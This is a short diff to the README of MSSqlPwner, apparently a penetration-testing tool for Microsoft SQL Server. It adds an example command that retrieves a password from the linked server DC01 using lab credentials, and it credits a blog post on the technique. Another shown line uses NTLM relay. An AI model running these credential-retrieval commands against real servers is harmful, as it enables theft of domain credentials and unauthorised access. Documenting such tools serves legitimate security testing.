@@ -89,8 +89,12 @@ python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay \\
 
 # Executing direct query
 python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth direct_query "SELECT CURRENT_USER"
+
+# Retrieving password from the linked server DC01
+python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password
 ```
 
 
 ## Thanks
 - [Kim Dvash](https://www.linkedin.com/in/kim-d-5b3114111) for designing this incredible logo.
+- [Pablo Martínez](https://www.tarlogic.com/blog/linked-servers-adsi-passwords/) for the inspiration and the idea of the retrieving password technique.
